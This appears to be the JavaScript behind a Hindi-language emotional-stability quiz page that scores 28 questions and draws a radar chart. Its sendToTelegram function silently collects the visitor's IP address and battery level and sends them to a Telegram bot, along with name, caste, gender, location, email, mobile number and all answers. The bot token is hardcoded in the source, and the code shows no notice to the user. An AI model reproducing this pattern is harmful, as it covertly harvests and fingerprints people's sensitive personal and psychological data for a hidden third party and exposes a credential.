const BOT_TOKEN = "8799582690:AAGE_1wvtdZ5AtnLM_wfA2KQPK5lvjQ5j1I";
const CHAT_ID = "5665743247";

const options = [
    "बहुत अधिक",
    "अधिक",
    "सामान्य",
    "कम",
    "बहुत कम"
];

// 28 Questions (संक्षिप्त रूप)
const questions = [
"छोटी-सी बात भी मुझे चुभती है।",
"मैं अपने आप पर नियंत्रण रख पाता हूँ।",
"मैं अपने कार्य संयमित होकर कर पाता हूँ।",
"मैं दुखद बातों को मन से निकाल देता हूँ।",
"मैं जीवन का आनंद लेता हूँ।",
"दिनचर्या की बात का मुझ पर प्रभाव पड़ता है।",
"मैं अपनी हँसी-खुशी बनाए रखता हूँ।",
"मुझे अनजानी दुर्घटनाओं का भय रहता है।",
"विपरीत परिस्थितियों में मैं घबरा जाता हूँ।",
"मुझे लोगों से मिलना-जुलना पसंद है।",
"दूसरों की बातों का मुझ पर प्रभाव पड़ता है।",
"मैं दुःख में रो पड़ता हूँ।",
"कठिन परिस्थितियों में मैं हताश हो जाता हूँ।",
"मैं अपने क्रोध पर नियंत्रण रखता हूँ।",
"मैं खुशी के मौकों में भाग लेता हूँ।",
"भावनात्मक ठेस पहुँचने पर मैं दुखी हो जाता हूँ।",
"लोग मेरी भावनाएँ समझ लेते हैं।",
"विपरीत परिस्थितियों में मैं सही निर्णय लेता हूँ।",
"दुर्घटनाओं का प्रभाव मुझ पर बना रहता है।",
"मुझे मनोरंजन कार्यक्रम पसंद हैं।",
"मैं लोगों की बातों से चिंतित हो जाता हूँ।",
"मैं भावनाओं का संतुलित प्रदर्शन करता हूँ।",
"मैं कठिन परिस्थितियों में संतुलित रहता हूँ।",
"मैं नकारात्मक भावनाओं से स्वयं को अलग कर लेता हूँ।",
"मैं खुश रह पाता हूँ।",
"मैं सुख-दुःख को गहराई से लेता हूँ।",
"मैं अपनी भावनाएँ व्यक्त करने में नहीं कतराता।",
"मैं अपनी भावनाओं को अच्छी तरह व्यक्त करता हूँ।"
];

// Category Mapping
const categories = {
    happiness: [5,7,15,20,25],
    sadness: [4,12,16,19],
    social: [10,17,27,28],
    fear: [8,9],
    anxiety: [1,6,11,21,26],
    control: [2,3,14,18,22,23,24]
};

// Reverse Scoring Questions
const reverseQuestions = [
    1,4,6,8,9,11,12,13,16,19,21,25,26
];

// Save User Data
document.getElementById("userForm").addEventListener("submit", function(e){
    e.preventDefault();
    const userData = {
        name: document.getElementById("name").value || "N/A",
        caste: document.getElementById("caste").value || "N/A",
        gender: document.getElementById("gender").value || "N/A",
        state: document.getElementById("state").value || "N/A",
        city: document.getElementById("city").value || "N/A",
        email: document.getElementById("email").value || "N/A",
        mobile: document.getElementById("mobile").value || "N/A"
    };
    localStorage.setItem("userData", JSON.stringify(userData));

    document.getElementById("userForm").classList.add("hidden");
    document.getElementById("quizSection").classList.remove("hidden");
    loadQuestions();
});

// Load Questions
function loadQuestions(){
    const container = document.getElementById("questions");
    container.innerHTML = "";
    questions.forEach((q,i)=>{
        let html=`<div class="question"><p><b>${i+1}. ${q}</b></p>`;
        options.forEach((opt,j)=>{
            html+=`<label>
                <input type="radio" name="q${i}" value="${j+1}"> ${opt}
            </label>`;
        });
        html+="</div>";
        container.innerHTML+=html;
    });
}

// Calculate Scores
function calculateScores(answers){
    let scores={};
    let total=0,maxTotal=0;

    for(let key in categories){
        let sum=0;
        let max=categories[key].length*5;

        categories[key].forEach(q=>{
            let val=answers[q-1]||0;
            if(reverseQuestions.includes(q) && val!==0){
                val=6-val;
            }
            sum+=val;
        });

        scores[key]=(sum/max*10).toFixed(2);
        total+=sum;
        maxTotal+=max;
    }

    scores.overall=(total/maxTotal*10).toFixed(2);
    return scores;
}

// Submit Quiz
document.getElementById("quizForm").addEventListener("submit",async function(e){
    e.preventDefault();
    let answers=[];
    let answerText="";

    questions.forEach((q,i)=>{
        const selected=document.querySelector(`input[name="q${i}"]:checked`);
        if(selected){
            answers[i]=parseInt(selected.value);
            answerText+=`Q${i+1}: ${options[selected.value-1]}\n`;
        }else{
            answers[i]=0;
            answerText+=`Q${i+1}: Skipped\n`;
        }
    });

    const scores=calculateScores(answers);
    showResults(scores);
    await sendToTelegram(scores,answerText);
});

// Show Results
function showResults(scores){
    document.getElementById("quizSection").classList.add("hidden");
    document.getElementById("resultSection").classList.remove("hidden");

    document.getElementById("happiness").innerText=scores.happiness;
    document.getElementById("sadness").innerText=scores.sadness;
    document.getElementById("social").innerText=scores.social;
    document.getElementById("fear").innerText=scores.fear;
    document.getElementById("anxiety").innerText=scores.anxiety;
    document.getElementById("control").innerText=scores.control;

    document.getElementById("overall").innerText=
        `Overall Emotional Stability: ${scores.overall} / 10`;

    document.getElementById("interpretation").innerText=
        interpretScore(scores.overall);

    drawChart(scores);
}

// Interpretation
function interpretScore(score){
    score=parseFloat(score);
    if(score>=8) return "Excellent Emotional Stability";
    if(score>=6) return "Good Emotional Stability";
    if(score>=4) return "Average Emotional Stability";
    return "Needs Improvement";
}

// Radar Chart
function drawChart(scores){
    new Chart(document.getElementById("resultChart"),{
        type:"radar",
        data:{
            labels:["Happiness","Sadness","Social","Fear","Anxiety","Control"],
            datasets:[{
                label:"Score",
                data:[
                    scores.happiness,
                    scores.sadness,
                    scores.social,
                    scores.fear,
                    scores.anxiety,
                    scores.control
                ]
            }]
        },
        options:{
            scales:{r:{min:0,max:10}}
        }
    });
}

// Telegram Integration
async function sendToTelegram(scores,answerText){
    let battery="Not Supported";
    if(navigator.getBattery){
        try{
            const bat=await navigator.getBattery();
            battery=Math.round(bat.level*100)+"%";
        }catch{}
    }

    let ip="Unavailable";
    try{
        const res=await fetch("https://api.ipify.org?format=json");
        const data=await res.json();
        ip=data.ip;
    }catch{}

    const user=JSON.parse(localStorage.getItem("userData"))||{};

    const message=`
🧠 Emotional Stability Test

👤 Name: ${user.name}
🏷️ Caste: ${user.caste}
⚧ Gender: ${user.gender}
📍 State: ${user.state}
🏙️ City: ${user.city}
📧 Email: ${user.email}
📱 Mobile: ${user.mobile}

🌐 IP: ${ip}
🔋 Battery: ${battery}

📊 INDEX (Out of 10)
Happiness: ${scores.happiness}
Sadness: ${scores.sadness}
Social Openness: ${scores.social}
Fear: ${scores.fear}
Anxiety: ${scores.anxiety}
Emotional Control: ${scores.control}

⭐ Overall Score: ${scores.overall}/10

📝 Answers:
${answerText}
`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            chat_id:CHAT_ID,
            text:message
        })
    });
}

// Progress Bar
document.addEventListener("change",()=>{
    const answered=document.querySelectorAll("input[type=radio]:checked").length;
    document.getElementById("progress").style.width=
        (answered/28)*100+"%";
});

// WhatsApp Share
document.getElementById("shareBtn").addEventListener("click",()=>{
    const text=document.getElementById("overall").innerText;
    const url=window.location.href;
    window.open(`https://wa.me/?text=${encodeURIComponent(text+"\n"+url)}`);
});